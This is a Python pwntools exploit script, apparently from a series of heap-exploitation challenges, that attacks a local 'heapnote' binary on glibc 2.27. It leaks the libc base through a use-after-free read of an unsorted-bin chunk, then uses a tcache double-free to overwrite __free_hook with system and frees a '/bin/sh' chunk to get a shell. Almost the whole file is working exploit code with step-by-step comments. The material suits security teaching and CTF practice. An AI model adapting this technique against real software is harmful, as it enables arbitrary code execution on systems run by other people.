#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
C2 - unsorted bin libc leak -> tcache poisoning -> __free_hook -> system
=======================================================================
Target  : ./heapnote  (glibc 2.27, -no-pie, partial RELRO)
Goal    : leak libc base, then overwrite __free_hook with system and free
          a chunk whose data is "/bin/sh" -> system("/bin/sh").
Leak    : unsorted bin fd = main_arena + 96.

The leak
--------
* tcache only serves chunk sizes 0x20..0x410. A request >= 0x418 makes a
  0x420 chunk that tcache does NOT hold; on free() it goes to the UNSORTED
  BIN (we keep a guard chunk after it so it does not merge into top).
* A freed unsorted-bin chunk's fd/bk point at the bin head, whose "chunk"
  address is main_arena + 96 (0x60) on 2.27 x86-64.
* main_arena sits right after __malloc_hook:  main_arena = __malloc_hook + 0x10.
  So:   libc_base = leak - (__malloc_hook + 0x10) - 96.
  We read every offset from the shipped libc at runtime, so the script is
  robust across 2.27-3ubuntu1.x sub-versions.

The write (tcache poisoning via double-free — reuses C1's 3-malloc rule)
-----------------------------------------------------------------------
* Double-free one tcache chunk -> self-loop A->A, counts=2 (2.27 GA has no
  tcache key, so the double-free is undetected — same primitive as C1).
* 3-malloc rule (identical to C1), now pointed at __free_hook instead of
  free@GOT: malloc#1 returns A, write __free_hook into A->fd; malloc#2
  returns A again (drains the self-loop), head=__free_hook; malloc#3
  returns __free_hook, write system.
* When malloc#3 pops __free_hook, entries = *(__free_hook) = 0 (the hook
  was 0 before we wrote system) -> the 0x70 bin is left EMPTY, so the
  subsequent "/bin/sh" malloc comes fresh from top (no poisoned-bin crash).
* Allocate a chunk containing "/bin/sh" and free it -> system("/bin/sh").

Run
---
    cd challenges && python3 c2_unsorted_leak/exp.py
"""

from pwn import *
import sys

# --demo: attach pwndbg in a tmux split pane. `break menu` stops the proc after
# every command with a clean pwndbg prompt (no Ctrl-C needed). At each DEMO hint
# run the named pwndbg command in the gdb pane, then `continue` there to advance.
# Without --demo the script runs straight to a shell (default; pipe-friendly).
DEMO = "--demo" in sys.argv

context.binary = exe = ELF("./heapnote")
libc = ELF("./glibc-2.27/libc-2.27.so")
context.log_level = "info"

p = process("./heapnote")

# ---- live demo support (gdb/pwndbg + tmux) ----------------------------------
# Run inside tmux:  python3 c2_unsorted_leak/exp.py --demo
# pwndbg attaches in a right-hand pane with `break menu`: the proc stops after
# every command, so you get a real pwndbg prompt to run `bins`/`tcache`/`heap`.
# Inspect at each DEMO hint, then `continue` in the gdb pane to advance.
def demo_hint(msg: str):
    if DEMO:
        log.info("DEMO | %s", msg)

if DEMO:
    context.terminal = ["tmux", "splitw", "-h", "-p", "55"]
    gdb.attach(p, gdbscript="break menu\ncontinue\n")
    demo_hint("gdb attached (right pane). Proc stops after each command; inspect, then `continue` to advance.")

# ---- menu helpers -----------------------------------------------------------
def add(idx: int, size: int, data: bytes):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.sendlineafter(b"size: ", str(size).encode())
    p.sendafter(b"data: ", data)

def delete(idx: int):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"idx: ", str(idx).encode())

def edit(idx: int, length: int, data: bytes):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.sendlineafter(b"len: ", str(length).encode())
    p.sendafter(b"data: ", data)

def show(idx: int) -> bytes:
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.recvuntil(b"data=")
    # the program writes exactly notes[idx]->size bytes then a newline
    line = p.recvuntil(b"\n", drop=True)
    return line

# ===========================================================================
# STAGE 1 - leak libc base via the unsorted bin
# ===========================================================================
# 0x418 request -> 0x420 chunk -> NOT tcache -> unsorted bin on free.
BIG = 0x418
add(0, BIG, b"A" * 8)        # chunk we will free into unsorted bin
add(1, 0x18, b"GUARD")       # guard so chunk 0 does not merge into top
delete(0)                    # -> unsorted bin; fd/bk = main_arena+96
demo_hint("run: bins | 0x420 chunk in the unsorted bin")

leak_raw = show(0)           # UAF-read: prints 8 bytes of the freed chunk's data
leak = u64(leak_raw[:8].ljust(8, b"\x00"))
log.info("unsorted bin fd leak = %#x", leak)

main_arena = libc.symbols["__malloc_hook"] + 0x10
libc.address = leak - main_arena - 96
log.success("libc base = %#x", libc.address)

system = libc.symbols["system"]
free_hook = libc.symbols["__free_hook"]
binsh = next(libc.search(b"/bin/sh\x00"))
log.info("system      = %#x", system)
log.info("__free_hook = %#x", free_hook)
log.info("/bin/sh     = %#x", binsh)

# ===========================================================================
# STAGE 2 - tcache poisoning (double-free, reuse C1's 3-malloc) -> __free_hook
# ===========================================================================
# 0x68 request -> 0x70 chunk (tcache bin; comfortable, avoids fastbins).
# Same primitive as C1: double-free one chunk -> self-loop A->A, counts=2,
# then the 3-malloc rule. Only the target changes: free@GOT -> __free_hook.
SZ = 0x68
add(2, SZ, b"X" * 8)
delete(2)                    # counts=1
delete(2)                    # counts=2, self-loop A->A (2.27 GA: no tcache key)
log.info("double-free done: 0x70 bin A->A, counts=2")
demo_hint("run: tcache | 0x70 bin A->A, counts=2")

# 3-malloc rule (identical to C1), now pointed at __free_hook:
add(3, SZ, p64(free_hook))   # malloc #1: returns A; write __free_hook into A->fd
log.info("malloc #1 = A; poisoned A->fd -> __free_hook")
add(4, SZ, b"DUMMY")         # malloc #2: returns A again (drains self-loop); head = __free_hook
log.info("malloc #2 (dummy); head now = __free_hook")
add(5, SZ, p64(system))      # malloc #3: returns __free_hook; write system
log.success("__free_hook = system")
demo_hint("run: p &__free_hook | value == system")

# ===========================================================================
# STAGE 3 - trigger: free a chunk whose data is "/bin/sh"
# ===========================================================================
add(6, SZ, b"/bin/sh\x00")
delete(6)                    # free(ptr) -> __free_hook(ptr) -> system("/bin/sh")
log.success("shell popped")

p.interactive()
